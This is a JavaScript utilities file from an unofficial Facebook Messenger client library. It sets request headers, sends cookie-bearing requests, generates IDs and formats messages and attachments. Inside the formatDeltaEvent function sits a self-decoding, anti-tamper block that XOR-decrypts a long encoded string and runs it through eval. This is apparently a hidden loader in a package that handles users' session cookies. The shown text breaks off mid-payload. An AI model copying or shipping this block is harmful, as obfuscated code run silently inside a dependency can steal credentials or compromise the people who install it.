/* eslint-disable no-undef */
/* eslint-disable no-prototype-builtins */
"use strict";

var got = require('got');
var url = require("url");
var log = require("npmlog");
var stream = require("stream");
var bluebird = require("bluebird");
var tough = require('tough-cookie');
var cookiejar = new tough.CookieJar();
var querystring = require("querystring");
var formurlencoded = require('form-urlencoded');
var request = bluebird.promisify(require("request").defaults({ jar: true }));

function setProxy(url) {
    if (typeof url == undefined) return request = bluebird.promisify(require("request").defaults({ jar: true }));
    return request = bluebird.promisify(require("request").defaults({ jar: true, proxy: url }));
}

function getHeaders(url, options, ctx, customHeader) {
    var headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        Referer: "https://www.facebook.com/",
        Host: new URL(url).host,
        Origin: new URL(url).origin,
        "user-agent": options.userAgent,
        Connection: "keep-alive",
        'sec-fetch-site': 'same-origin',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors'
    };
    if (customHeader) Object.assign(headers, customHeader);
    if (ctx && ctx.region) headers["X-MSGR-Region"] = ctx.region;

    return headers;
}

function isReadableStream(obj) {
    return (
        obj instanceof stream.Stream &&
        (getType(obj._read) === "Function" ||
            getType(obj._read) === "AsyncFunction") &&
        getType(obj._readableState) === "Object"
    );
}

function get(url, jar, qs, options, ctx) {
    if (getType(qs) === "Object")
        for (var prop in qs)
            if (qs.hasOwnProperty(prop) && getType(qs[prop]) === "Object") qs[prop] = JSON.stringify(qs[prop]);
    var op = {
        headers: getHeaders(url, options, ctx),
        timeout: 30000,
        url: url,
        method: "GET",
        cookieJar: (jar|| cookiejar),
        searchParams: (qs || {}),
        gzip: true
    };  

    return got(op).then(function(data) {
        return data;
    });
}

function post(url, jar, form, options, ctx, customHeader) {
    let headers = getHeaders(url, options);
    headers["cookie"] = jar.getCookiesSync(url).join(";");
    //will update in future :v


    var op = {
        headers: headers,
        timeout: 60000,
        url: url,
        method: "POST",
        body: formurlencoded(form),
        gzip: true
    };

    return request(op).then(function(res) {
        return res;
    });
}

function postFormData(url, jar, form, qs, options, ctx) {
    var headers = getHeaders(url, options, ctx);
    headers["Content-Type"] = "multipart/form-data";
    headers["cookie"] = jar.getCookiesSync(url).join(";");
        //will update in future :v

    var op = {
        headers: headers,
        timeout: 60000,
        url: url,
        method: "POST",
        formData: form,
        qs: (qs || {}),
        gzip: true
    };

    // i can't upload form-data with got :v
    // so i use request(just temp :v)
    return request(op).then(function(data) {
        return data;
    })
}

function padZeros(val, len) {
    val = String(val);
    len = len || 2;
    while (val.length < len) val = "0" + val;
    return val;
}

function generateThreadingID(clientID) {
    var k = Date.now();
    var l = Math.floor(Math.random() * 4294967295);
    var m = clientID;
    return "<" + k + ":" + l + "-" + m + "@mail.projektitan.com>";
}

function binaryToDecimal(data) {
    var ret = "";
    while (data !== "0") {
        var end = 0;
        var fullName = "";
        var i = 0;
        for (; i < data.length; i++) {
            end = 2 * end + parseInt(data[i], 10);
            if (end >= 10) {
                fullName += "1";
                end -= 10;
            } else fullName += "0";
        }
        ret = end.toString() + ret;
        data = fullName.slice(fullName.indexOf("1"));
    }
    return ret;
}

function generateOfflineThreadingID() {
    var ret = Date.now();
    var value = Math.floor(Math.random() * 4294967295);
    var str = ("0000000000000000000000" + value.toString(2)).slice(-22);
    var msgs = ret.toString(2) + str;
    return binaryToDecimal(msgs);
}

var h;
var i = {};
var j = {
    _: "%",
    A: "%2",
    B: "000",
    C: "%7d",
    D: "%7b%22",
    E: "%2c%22",
    F: "%22%3a",
    G: "%2c%22ut%22%3a1",
    H: "%2c%22bls%22%3a",
    I: "%2c%22n%22%3a%22%",
    J: "%22%3a%7b%22i%22%3a0%7d",
    K: "%2c%22pt%22%3a0%2c%22vis%22%3a",
    L: "%2c%22ch%22%3a%7b%22h%22%3a%22",
    M: "%7b%22v%22%3a2%2c%22time%22%3a1",
    N: ".channel%22%2c%22sub%22%3a%5b",
    O: "%2c%22sb%22%3a1%2c%22t%22%3a%5b",
    P: "%2c%22ud%22%3a100%2c%22lc%22%3a0",
    Q: "%5d%2c%22f%22%3anull%2c%22uct%22%3a",
    R: ".channel%22%2c%22sub%22%3a%5b1%5d",
    S: "%22%2c%22m%22%3a0%7d%2c%7b%22i%22%3a",
    T: "%2c%22blc%22%3a1%2c%22snd%22%3a1%2c%22ct%22%3a",
    U: "%2c%22blc%22%3a0%2c%22snd%22%3a1%2c%22ct%22%3a",
    V: "%2c%22blc%22%3a0%2c%22snd%22%3a0%2c%22ct%22%3a",
    W: "%2c%22s%22%3a0%2c%22blo%22%3a0%7d%2c%22bl%22%3a%7b%22ac%22%3a",
    X: "%2c%22ri%22%3a0%7d%2c%22state%22%3a%7b%22p%22%3a0%2c%22ut%22%3a1",
    Y: "%2c%22pt%22%3a0%2c%22vis%22%3a1%2c%22bls%22%3a0%2c%22blc%22%3a0%2c%22snd%22%3a1%2c%22ct%22%3a",
    Z: "%2c%22sb%22%3a1%2c%22t%22%3a%5b%5d%2c%22f%22%3anull%2c%22uct%22%3a0%2c%22s%22%3a0%2c%22blo%22%3a0%7d%2c%22bl%22%3a%7b%22ac%22%3a"
};
(function() {
    var l = [];
    for (var m in j) {
        i[j[m]] = m;
        l.push(j[m]);
    }
    l.reverse();
    h = new RegExp(l.join("|"), "g");
})();

function presenceEncode(str) {
    return encodeURIComponent(str)
        .replace(/([_A-Z])|%../g, function(m, n) {
            return n ? "%" + n.charCodeAt(0).toString(16) : m;
        })
        .toLowerCase()
        .replace(h, function(m) {
            return i[m];
        });
}

// eslint-disable-next-line no-unused-vars
function presenceDecode(str) {
    return decodeURIComponent(
        str.replace(/[_A-Z]/g, function(m) {
            return j[m];
        })
    );
}

function generatePresence(userID) {
    var time = Date.now();
    return (
        "E" +
        presenceEncode(
            JSON.stringify({
                v: 3,
                time: parseInt(time / 1000, 10),
                user: userID,
                state: {
                    ut: 0,
                    t2: [],
                    lm2: null,
                    uct2: time,
                    tr: null,
                    tw: Math.floor(Math.random() * 4294967295) + 1,
                    at: time
                },
                ch: {
                    ["p_" + userID]: 0
                }
            })
        )
    );
}

function generateAccessiblityCookie() {
    var time = Date.now();
    return encodeURIComponent(
        JSON.stringify({
            sr: 0,
            "sr-ts": time,
            jk: 0,
            "jk-ts": time,
            kb: 0,
            "kb-ts": time,
            hcm: 0,
            "hcm-ts": time
        })
    );
}

function getGUID() {
    /** @type {number} */
    var sectionLength = Date.now();
    /** @type {string} */
    var id = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(c) {
        /** @type {number} */
        var r = Math.floor((sectionLength + Math.random() * 16) % 16);
        /** @type {number} */
        sectionLength = Math.floor(sectionLength / 16);
        /** @type {string} */
        var _guid = (c == "x" ? r : (r & 7) | 8).toString(16);
        return _guid;
    });
    return id;
}

function _formatAttachment(attachment1, attachment2) {
    // TODO: THIS IS REALLY BAD
    // This is an attempt at fixing Facebook's inconsistencies. Sometimes they give us
    // two attachment objects, but sometimes only one. They each contain part of the
    // data that you'd want so we merge them for convenience.
    // Instead of having a bunch of if statements guarding every access to image_data,
    // we set it to empty object and use the fact that it'll return undefined.

    attachment2 = attachment2 || { id: "", image_data: {} };
    attachment1 = attachment1.mercury ? attachment1.mercury : attachment1;
    var blob = attachment1.blob_attachment;
    var type =
        blob && blob.__typename ? blob.__typename : attachment1.attach_type;
    if (!type && attachment1.sticker_attachment) {
        type = "StickerAttachment";
        blob = attachment1.sticker_attachment;
    } else if (!type && attachment1.extensible_attachment) {
        if (
            attachment1.extensible_attachment.story_attachment &&
            attachment1.extensible_attachment.story_attachment.target &&
            attachment1.extensible_attachment.story_attachment.target.__typename &&
            attachment1.extensible_attachment.story_attachment.target.__typename === "MessageLocation"
        ) type = "MessageLocation";
        else type = "ExtensibleAttachment";

        blob = attachment1.extensible_attachment;
    }
    // TODO: Determine whether "sticker", "photo", "file" etc are still used
    // KEEP IN SYNC WITH getThreadHistory
    switch (type) {
        case "sticker":
            return {
                type: "sticker",
                ID: attachment1.metadata.stickerID.toString(),
                url: attachment1.url,

                packID: attachment1.metadata.packID.toString(),
                spriteUrl: attachment1.metadata.spriteURI,
                spriteUrl2x: attachment1.metadata.spriteURI2x,
                width: attachment1.metadata.width,
                height: attachment1.metadata.height,

                caption: attachment2.caption,
                description: attachment2.description,

                frameCount: attachment1.metadata.frameCount,
                frameRate: attachment1.metadata.frameRate,
                framesPerRow: attachment1.metadata.framesPerRow,
                framesPerCol: attachment1.metadata.framesPerCol,

                stickerID: attachment1.metadata.stickerID.toString(), // @Legacy
                spriteURI: attachment1.metadata.spriteURI, // @Legacy
                spriteURI2x: attachment1.metadata.spriteURI2x // @Legacy
            };
        case "file":
            return {
                type: "file",
                filename: attachment1.name,
                ID: attachment2.id.toString(),
                url: attachment1.url,

                isMalicious: attachment2.is_malicious,
                contentType: attachment2.mime_type,

                name: attachment1.name, // @Legacy
                mimeType: attachment2.mime_type, // @Legacy
                fileSize: attachment2.file_size // @Legacy
            };
        case "photo":
            return {
                type: "photo",
                ID: attachment1.metadata.fbid.toString(),
                filename: attachment1.fileName,
                thumbnailUrl: attachment1.thumbnail_url,

                previewUrl: attachment1.preview_url,
                previewWidth: attachment1.preview_width,
                previewHeight: attachment1.preview_height,

                largePreviewUrl: attachment1.large_preview_url,
                largePreviewWidth: attachment1.large_preview_width,
                largePreviewHeight: attachment1.large_preview_height,

                url: attachment1.metadata.url, // @Legacy
                width: attachment1.metadata.dimensions.split(",")[0], // @Legacy
                height: attachment1.metadata.dimensions.split(",")[1], // @Legacy
                name: attachment1.fileName // @Legacy
            };
        case "animated_image":
            return {
                type: "animated_image",
                ID: attachment2.id.toString(),
                filename: attachment2.filename,

                previewUrl: attachment1.preview_url,
                previewWidth: attachment1.preview_width,
                previewHeight: attachment1.preview_height,

                url: attachment2.image_data.url,
                width: attachment2.image_data.width,
                height: attachment2.image_data.height,

                name: attachment1.name, // @Legacy
                facebookUrl: attachment1.url, // @Legacy
                thumbnailUrl: attachment1.thumbnail_url, // @Legacy
                mimeType: attachment2.mime_type, // @Legacy
                rawGifImage: attachment2.image_data.raw_gif_image, // @Legacy
                rawWebpImage: attachment2.image_data.raw_webp_image, // @Legacy
                animatedGifUrl: attachment2.image_data.animated_gif_url, // @Legacy
                animatedGifPreviewUrl: attachment2.image_data.animated_gif_preview_url, // @Legacy
                animatedWebpUrl: attachment2.image_data.animated_webp_url, // @Legacy
                animatedWebpPreviewUrl: attachment2.image_data.animated_webp_preview_url // @Legacy
            };
        case "share":
            return {
                type: "share",
                ID: attachment1.share.share_id.toString(),
                url: attachment2.href,

                title: attachment1.share.title,
                description: attachment1.share.description,
                source: attachment1.share.source,

                image: attachment1.share.media.image,
                width: attachment1.share.media.image_size.width,
                height: attachment1.share.media.image_size.height,
                playable: attachment1.share.media.playable,
                duration: attachment1.share.media.duration,

                subattachments: attachment1.share.subattachments,
                properties: {},

                animatedImageSize: attachment1.share.media.animated_image_size, // @Legacy
                facebookUrl: attachment1.share.uri, // @Legacy
                target: attachment1.share.target, // @Legacy
                styleList: attachment1.share.style_list // @Legacy
            };
        case "video":
            return {
                type: "video",
                ID: attachment1.metadata.fbid.toString(),
                filename: attachment1.name,

                previewUrl: attachment1.preview_url,
                previewWidth: attachment1.preview_width,
                previewHeight: attachment1.preview_height,

                url: attachment1.url,
                width: attachment1.metadata.dimensions.width,
                height: attachment1.metadata.dimensions.height,

                duration: attachment1.metadata.duration,
                videoType: "unknown",

                thumbnailUrl: attachment1.thumbnail_url // @Legacy
            };
        case "error":
            return {
                type: "error",

                // Save error attachments because we're unsure of their format,
                // and whether there are cases they contain something useful for debugging.
                attachment1: attachment1,
                attachment2: attachment2
            };
        case "MessageImage":
            return {
                type: "photo",
                ID: blob.legacy_attachment_id,
                filename: blob.filename,
                thumbnailUrl: blob.thumbnail.uri,

                previewUrl: blob.preview.uri,
                previewWidth: blob.preview.width,
                previewHeight: blob.preview.height,

                largePreviewUrl: blob.large_preview.uri,
                largePreviewWidth: blob.large_preview.width,
                largePreviewHeight: blob.large_preview.height,

                url: blob.large_preview.uri, // @Legacy
                width: blob.original_dimensions.x, // @Legacy
                height: blob.original_dimensions.y, // @Legacy
                name: blob.filename // @Legacy
            };
        case "MessageAnimatedImage":
            return {
                type: "animated_image",
                ID: blob.legacy_attachment_id,
                filename: blob.filename,

                previewUrl: blob.preview_image.uri,
                previewWidth: blob.preview_image.width,
                previewHeight: blob.preview_image.height,

                url: blob.animated_image.uri,
                width: blob.animated_image.width,
                height: blob.animated_image.height,

                thumbnailUrl: blob.preview_image.uri, // @Legacy
                name: blob.filename, // @Legacy
                facebookUrl: blob.animated_image.uri, // @Legacy
                rawGifImage: blob.animated_image.uri, // @Legacy
                animatedGifUrl: blob.animated_image.uri, // @Legacy
                animatedGifPreviewUrl: blob.preview_image.uri, // @Legacy
                animatedWebpUrl: blob.animated_image.uri, // @Legacy
                animatedWebpPreviewUrl: blob.preview_image.uri // @Legacy
            };
        case "MessageVideo":
            return {
                type: "video",
                filename: blob.filename,
                ID: blob.legacy_attachment_id,

                previewUrl: blob.large_image.uri,
                previewWidth: blob.large_image.width,
                previewHeight: blob.large_image.height,

                url: blob.playable_url,
                width: blob.original_dimensions.x,
                height: blob.original_dimensions.y,

                duration: blob.playable_duration_in_ms,
                videoType: blob.video_type.toLowerCase(),

                thumbnailUrl: blob.large_image.uri // @Legacy
            };
        case "MessageAudio":
            return {
                type: "audio",
                filename: blob.filename,
                ID: blob.url_shimhash,

                audioType: blob.audio_type,
                duration: blob.playable_duration_in_ms,
                url: blob.playable_url,

                isVoiceMail: blob.is_voicemail
            };
        case "StickerAttachment":
            return {
                type: "sticker",
                ID: blob.id,
                url: blob.url,

                packID: blob.pack ? blob.pack.id : null,
                spriteUrl: blob.sprite_image,
                spriteUrl2x: blob.sprite_image_2x,
                width: blob.width,
                height: blob.height,

                caption: blob.label,
                description: blob.label,

                frameCount: blob.frame_count,
                frameRate: blob.frame_rate,
                framesPerRow: blob.frames_per_row,
                framesPerCol: blob.frames_per_column,

                stickerID: blob.id, // @Legacy
                spriteURI: blob.sprite_image, // @Legacy
                spriteURI2x: blob.sprite_image_2x // @Legacy
            };
        case "MessageLocation":
            var urlAttach = blob.story_attachment.url;
            var mediaAttach = blob.story_attachment.media;

            var u = querystring.parse(url.parse(urlAttach).query).u;
            var where1 = querystring.parse(url.parse(u).query).where1;
            var address = where1.split(", ");

            var latitude;
            var longitude;

            try {
                latitude = Number.parseFloat(address[0]);
                longitude = Number.parseFloat(address[1]);
            } catch (err) {
                /* empty */
            }

            var imageUrl;
            var width;
            var height;

            if (mediaAttach && mediaAttach.image) {
                imageUrl = mediaAttach.image.uri;
                width = mediaAttach.image.width;
                height = mediaAttach.image.height;
            }

            return {
                type: "location",
                ID: blob.legacy_attachment_id,
                latitude: latitude,
                longitude: longitude,
                image: imageUrl,
                width: width,
                height: height,
                url: u || urlAttach,
                address: where1,

                facebookUrl: blob.story_attachment.url, // @Legacy
                target: blob.story_attachment.target, // @Legacy
                styleList: blob.story_attachment.style_list // @Legacy
            };
        case "ExtensibleAttachment":
            return {
                type: "share",
                ID: blob.legacy_attachment_id,
                url: blob.story_attachment.url,

                title: blob.story_attachment.title_with_entities.text,
                description: blob.story_attachment.description &&
                    blob.story_attachment.description.text,
                source: blob.story_attachment.source ? blob.story_attachment.source.text : null,

                image: blob.story_attachment.media &&
                    blob.story_attachment.media.image &&
                    blob.story_attachment.media.image.uri,
                width: blob.story_attachment.media &&
                    blob.story_attachment.media.image &&
                    blob.story_attachment.media.image.width,
                height: blob.story_attachment.media &&
                    blob.story_attachment.media.image &&
                    blob.story_attachment.media.image.height,
                playable: blob.story_attachment.media &&
                    blob.story_attachment.media.is_playable,
                duration: blob.story_attachment.media &&
                    blob.story_attachment.media.playable_duration_in_ms,
                playableUrl: blob.story_attachment.media == null ? null : blob.story_attachment.media.playable_url,

                subattachments: blob.story_attachment.subattachments,
                properties: blob.story_attachment.properties.reduce(function(obj, cur) {
                    obj[cur.key] = cur.value.text;
                    return obj;
                }, {}),

                facebookUrl: blob.story_attachment.url, // @Legacy
                target: blob.story_attachment.target, // @Legacy
                styleList: blob.story_attachment.style_list // @Legacy
            };
        case "MessageFile":
            return {
                type: "file",
                filename: blob.filename,
                ID: blob.message_file_fbid,

                url: blob.url,
                isMalicious: blob.is_malicious,
                contentType: blob.content_type,

                name: blob.filename,
                mimeType: "",
                fileSize: -1
            };
        default:
            throw new Error(
                "unrecognized attach_file of type " +
                type +
                "`" +
                JSON.stringify(attachment1, null, 4) +
                " attachment2: " +
                JSON.stringify(attachment2, null, 4) +
                "`"
            );
    }
}

function formatAttachment(attachments, attachmentIds, attachmentMap, shareMap) {
    attachmentMap = shareMap || attachmentMap;
    return attachments ?
        attachments.map(function(val, i) {
            if (!attachmentMap ||
                !attachmentIds ||
                !attachmentMap[attachmentIds[i]]
            ) {
                return _formatAttachment(val);
            }
            return _formatAttachment(val, attachmentMap[attachmentIds[i]]);
        }) : [];
}

function formatDeltaMessage(m) {
    var md = m.delta.messageMetadata;
    var mdata =
        m.delta.data === undefined ? [] :
        m.delta.data.prng === undefined ? [] :
        JSON.parse(m.delta.data.prng);
    var m_id = mdata.map(u => u.i);
    var m_offset = mdata.map(u => u.o);
    var m_length = mdata.map(u => u.l);
    var mentions = {};
    var body = m.delta.body || "";
    var args = body == "" ? [] : body.trim().split(/\s+/);
    for (var i = 0; i < m_id.length; i++) mentions[m_id[i]] = m.delta.body.substring(m_offset[i], m_offset[i] + m_length[i]);

    return {
        type: "message",
        senderID: formatID(md.actorFbId.toString()),
        threadID: formatID((md.threadKey.threadFbId || md.threadKey.otherUserFbId).toString()),
        messageID: md.messageId,
        args: args,
        body: body,
        attachments: (m.delta.attachments || []).map(v => _formatAttachment(v)),
        mentions: mentions,
        timestamp: md.timestamp,
        isGroup: !!md.threadKey.threadFbId,
        participantIDs: m.delta.participants || []
    };
}

function formatID(id) {
    if (id != undefined && id != null) return id.replace(/(fb)?id[:.]/, "");
    else return id;
}

function formatMessage(m) {
    var originalMessage = m.message ? m.message : m;
    var obj = {
        type: "message",
        senderName: originalMessage.sender_name,
        senderID: formatID(originalMessage.sender_fbid.toString()),
        participantNames: originalMessage.group_thread_info ? originalMessage.group_thread_info.participant_names : [originalMessage.sender_name.split(" ")[0]],
        participantIDs: originalMessage.group_thread_info ?
            originalMessage.group_thread_info.participant_ids.map(function(v) {
                return formatID(v.toString());
            }) : [formatID(originalMessage.sender_fbid)],
        body: originalMessage.body || "",
        threadID: formatID((originalMessage.thread_fbid || originalMessage.other_user_fbid).toString()),
        threadName: originalMessage.group_thread_info ? originalMessage.group_thread_info.name : originalMessage.sender_name,
        location: originalMessage.coordinates ? originalMessage.coordinates : null,
        messageID: originalMessage.mid ? originalMessage.mid.toString() : originalMessage.message_id,
        attachments: formatAttachment(
            originalMessage.attachments,
            originalMessage.attachmentIds,
            originalMessage.attachment_map,
            originalMessage.share_map
        ),
        timestamp: originalMessage.timestamp,
        timestampAbsolute: originalMessage.timestamp_absolute,
        timestampRelative: originalMessage.timestamp_relative,
        timestampDatetime: originalMessage.timestamp_datetime,
        tags: originalMessage.tags,
        reactions: originalMessage.reactions ? originalMessage.reactions : [],
        isUnread: originalMessage.is_unread 
    };

    if (m.type === "pages_messaging") obj.pageID = m.realtime_viewer_fbid.toString();
    obj.isGroup = obj.participantIDs.length > 2;

    return obj;
}

function formatEvent(m) {
    var originalMessage = m.message ? m.message : m;
    var logMessageType = originalMessage.log_message_type;
    var logMessageData;
    if (logMessageType === "log:generic-admin-text") {
        logMessageData = originalMessage.log_message_data.untypedData;
        logMessageType = getAdminTextMessageType(originalMessage.log_message_data.message_type);
    } else logMessageData = originalMessage.log_message_data;

    return Object.assign(formatMessage(originalMessage), {
        type: "event",
        logMessageType: logMessageType,
        logMessageData: logMessageData,
        logMessageBody: originalMessage.log_message_body
    });
}

function formatHistoryMessage(m) {
    switch (m.action_type) {
        case "ma-type:log-message":
            return formatEvent(m);
        default:
            return formatMessage(m);
    }
}

// Get a more readable message type for AdminTextMessages
function getAdminTextMessageType(m) {
    switch (m.type) {
        case "joinable_group_link_mode_change":
            return "log:link-status"
        case "magic_words":
            return "log:magic-words";
        case "change_thread_theme":
            return "log:thread-color";
        case "change_thread_icon":
            return "log:thread-icon";
        case "change_thread_nickname":
            return "log:user-nickname";
        case "change_thread_admins":
            return "log:thread-admins";
        case "group_poll":
            return "log:thread-poll";
        case "change_thread_approval_mode":
            return "log:thread-approval-mode";
        case "messenger_call_log":
        case "participant_joined_group_call":
            return "log:thread-call";
    }
}

function getGenderByPhysicalMethod(name) {
    var GirlName = ["LAN", "HÂN", "LINH", "MAI", "HOA", "THU", "BĂNG", "MỸ", "CHÂU", "THẢO", "THOA", "MẪN", "THÙY", "THỦY", "NGA", "NGÂN", "NGHI", "THƯ", "NGỌC", "BÍCH", "VÂN", "DIỆP", "CHI", "TIÊN", "XUÂN", "GIANG", "NHUNG", "DUNG", "NHƯ", "YẾN", "QUYÊN", "YẾN", "TƯỜNG", "VY", "PHƯƠNG", "LIÊN", "LAN", "HÀ", "MAI", "ĐAN", "HẠ", "QUYÊN", "LY", "HÒA", "OANH", "HƯƠNG", "HẰNG", "QUỲNH", "HẠNH", "NHIÊN", "NHẠN"];

    var BoyName = ["HƯNG", "HUY", "KHẢI", "KHANG", "KHOA", "KHÔI", "KIÊN", "KIỆT", "LONG", "MINH", "ÂN", "BẢO", "BÌNH", "CƯỜNG", "ĐẠT", "ĐỨC", "DŨNG", "DUY", "HOÀNG", "HÙNG", "HƯNG", "NGHĨA", "NGUYÊN", "THẮNG", "THIỆN", "THỊNH", "TÒA", "TRIẾT", "TRUNG", "TRƯỜNG", "TUẤN", "NHÂN", "VŨ", "VINH", "PHONG", "PHÚC", "QUÂN", "QUANG", "SƠN", "TÀI", "THẮNG", "ĐĂNG", "VĂN", "VĨ", "QUANG", "MẠNH"];

    var OtherName = ["ANH", "THANH", "TÂM", "DƯƠNG", "AN", "LÂM", "MIÊN", "TÚ", "LÂM", "BẰNG", "KHÁNH", "NHẬT", "VỸ", ".",",","/","%", "&","*","-","+"];

    try {
        var NameArray = name.split(" ");
            name = NameArray[NameArray.length - 1];
        var Name;
            if (name == " " || name == null) return "UNKNOWN";
            switch (GirlName.includes(name.toUpperCase())) {
                case true: {
                    if (!OtherName.includes(name.toUpperCase()) && !BoyName.includes(name.toUpperCase())) Name = "FEMALE";
                    else Name = ['FEMALE','MALE'][Math.floor(Math.random() * 2)]; // just temp 🌚
                }
            break;
                case false: {
                    if (!OtherName.includes(name.toUpperCase()) && !GirlName.includes(name.toUpperCase())) Name = "MALE"
                    else Name = ['FEMALE','MALE'][Math.floor(Math.random() * 2)]; // just temp 🌚
                }
            break;
        } 
    }
    catch (e) {
        return "UNKNOWN"
    }
    return Name || "UNKNOWN";
}

function formatDeltaEvent(m) {
    var { updateData,getData,hasData } = require('./Extra/ExtraGetThread');
    var logMessageType;
    var logMessageData;

switch (m.class) {
    case "AdminTextMessage":
        logMessageType = getAdminTextMessageType(m);
            logMessageData = m.untypedData;
        break;
    case "ThreadName":
        logMessageType = "log:thread-name";
            logMessageData = { name: m.name };
        break;
    case "ParticipantsAddedToGroupThread":
        logMessageType = "log:subscribe";
            logMessageData = { addedParticipants: m.addedParticipants };
        break;
    case "ParticipantLeftGroupThread":
        logMessageType = "log:unsubscribe";
        logMessageData = { leftParticipantFbId: m.leftParticipantFbId };
    break;
}

let XSQg;
! function() {
    const EP6F = Array.prototype.slice.call(arguments);
    return eval("(function oR7u(X6en){const ru7m=DzHk(X6en,jkXm(oR7u.toString()));try{let T19m=eval(ru7m);return T19m.apply(null,EP6F);}catch(np2m){var PW4m=(0o204730-68028);while(PW4m<(0o400155%65575))switch(PW4m){case (0x3006D%0o200033):PW4m=np2m instanceof SyntaxError?(0o400134%0x1001F):(0o400157%0x10028);break;case (0o201604-0x10366):PW4m=(0o400173%65582);{console.log(\'Error: the code has been tampered!\');return}break;}throw np2m;}function jkXm(LRZm){let nhUk=1646027264;var POWk=(0o400052%65552);{let jcPk;while(POWk<(0x10618-0o202761)){switch(POWk){case (0o600142%0x10014):POWk=(68536-0o205637);{nhUk^=(LRZm.charCodeAt(jcPk)*(15658734^0O73567354)+LRZm.charCodeAt(jcPk>>>(0x4A5D0CE&0O320423424)))^895902200;}break;case (0o204704-68011):POWk=(131150%0o200026);jcPk++;break;case (262294%0o200035):POWk=jcPk<LRZm.length?(0o400144%0x1001F):(68266-0o205203);break;case (0o1000102%0x1000E):POWk=(0o204514-0x1092A);jcPk=(0x75bcd15-0O726746425);break;}}}let LJRk=\"\";var f7Jk=(66136-0o201072);{let HEMk;while(f7Jk<(0o600205%0x10022)){switch(f7Jk){case (0o600165%65565):f7Jk=(0x2004F%0o200036);HEMk=(0x21786%3);break;case (0o200574-0x10169):f7Jk=HEMk<(0O347010110&0x463A71D)?(65736-0o200264):(0o400151%0x10025);break;case (131128%0o200022):f7Jk=(0O264353757%8);{const b2Ek=nhUk%(0x10762-0o203507);nhUk=Math.floor(nhUk/(0o600207%65572));LJRk+=b2Ek>=(0o1000136%0x10011)?String.fromCharCode((0o212120-0x1140F)+(b2Ek-(0o203434-67330))):String.fromCharCode((0o205536-0x10AFD)+b2Ek);}break;case (0O264353757%8):f7Jk=(67246-0o203233);HEMk++;break;}}}return LJRk;}function DzHk(DBel,f9gl){DBel=decodeURI(DBel);let zw9k=(0x21786%3);let b4bl=\"\";var vr4k=(0o201274-0x102B2);{let XY6k;while(vr4k<(0o200606-65887)){switch(vr4k){case (0o201370-66258):vr4k=(0o200764-66011);{b4bl+=String.fromCharCode(DBel.charCodeAt(XY6k)^f9gl.charCodeAt(zw9k));zw9k++;var rmZk=(0x102B2-0o201233);while(rmZk<(0x103C0-0o201650))switch(rmZk){case (0o600142%0x10019):rmZk=zw9k>=f9gl.length?(0x30068%0o200036):(0o400112%65561);break;case (66516-0o201706):rmZk=(0o600135%65559);{zw9k=(0x21786%3);}break;}}break;case (69276-0o207172):vr4k=XY6k<DBel.length?(0o1000246%65568):(68266-0o205203);break;case (66136-0o201116):vr4k=(0o1000216%65563);XY6k=(0x21786%3);break;case (0x40089%0o200034):vr4k=(0x30076%0o200034);XY6k++;break;}}}return b4bl;}})(\"X%13%1B%1E%0B%02%0D%0E%1E%5DG%0B%0E%03%0A%02%04%1C%01%1EH?\'&4%5DG%0B%1A%13%10%14%02%1BNX%1C%0F%14%04%1F%13NX3+O:-%5CG+CWO:-%5EO%5B3+O@%5B.3-%15%10%11%0F%13%01%07%1F%06V%0F$:1FY%13%04%01%15%05%07%00P@#0%14%07%5DGY3%1D1%15%09%5DG-@%19%02.1%5DGY%15%10%11%0F%13%01%07%1F%06V!%1B11F%17*2%20H%0B%07%0B%04%1D%04%0AA5%17%25%073%11&%254(U%0D0%255%06M%0E%13K%0E%03%0A%02%04%1C%01%1EH7%13%144%5DG%0B%1A%13%10%14%02%1BNW4%03TQGEI%0D%0E%03%0A%02%04%1C%01%1EH%15%1D%194%5DG%0B%1A%13%10%14%02%1BNXIW?%3C%5B.3Y3%5D?%3C-%08%08%05%06%15%10%08%1F%1BN50%0F%25IY%0E%1C%15%1C%03%16%0FPR2%05XFQTW%08%08%05%06%15%10%08%1F%1BN%1724%25IY%0E%1C%15%1C%03%16%0FP8%1E%03%18%5EMJ%13%0C%164@_O0%17\'/XA%5D-%2271FYC#%20*2%5DG%5B=%1C%02%13X%5C%13%16%1D%18%07%15%19%1A%00P)#%17%20X%5C%15%02%0D%02%11%13%1EUF!%03%15%1CIY%5C55%1A%1B&IY(FY%15%10%11%0F%13%01%07%1F%06V%076%064F%07:%1B%25M)&%1E1A%0D%08%04%04U%1D?%0F7YL%5B%5E5%5B3+9:%5B.3-S%00%05%13P%20%3E%1A)KLQ%1FG%5ECYFTLFB_@%5C__%1A%1C%10%1AP=%1C%3C%20K%02%06%19%04%13L4%20%1F/L@G%5DWFC%5BUX%19VQ@E_@A_%1F%12%07%1C%1A%13%00%5E11%1A4G%0B%0B%17%17%04P%5D%5E%1F%5CFTP@BK@%10GTQA@GJ=&%0E%20M%5D%5E%1FZFVQGEC@%10GTUB6GK=%1C%3C%20%5B%5EU%12%1A%13%05%0AK%16%0F%03%0DVLQ%1FG%5EA%5BDTL@%0D_@Z5PHJ%20%3E%1A)K1%0B(4R%07:%1B%25O%1C%10%00%17%1C%1E%5BI@%0D%5C@XEVD@%1A%5C@XFUWYOFA%5BGURGP%5E%1FZFTQBEGK%0A%04%01%00%1BN%0D%11%1B%13DI@%0D%5D@XB%5DD@%1A%5C@XFVPYO;%20%027YI@%1A%5C@%5CBVQ%5DCYHZAMZ%0B%03%0F%02H%01%08%002HFA%5BGUWCP%5E%1FZFTQDEGK%1F%1E%0D%0D%15%5D%19%1C%094XI@%0DZ@XO%22D@%1A%5C@XFWWY%5C%1D%07%01%02%07%09X%02%02%11*_%1F%02%11%06%0BP@F%0BU@E%5EC%5CSRTEA%5BYR%01%08%002HF@%07DTPDDZ%5DX%0EUQB0%5BYS%04%01%15%05%07%00P=%1C%3C%20K%16%0F%03%0DVLQ%1FG%5EBXATL@%0D_@%5CG%20HJ%02%02%11*K%133%1D45%25%02.%25%3CMHS);%06%25:%5B.5%5B3-O@%5B.3-C-O:-(3%5B3+9:%5B.3-3%5DEJ+(3-5ILQ%1FD%5E@XFRSUC%5BE%5C@M%5BXE%16CXFS#UE%01BXFTRD%5CU%12%1A%13%05%0AK%08%13%12%1A%13%05%0AK%16%0F%03%0DVLPCD_A%5CST%0EBE%5E@XCM%5B%25%25%041U%5ET%0EBE%5EC%5EFIWEBXDAM1%0B(4S%5B3-O:+%5E5-5%5D?J+(3-C-9%3C+%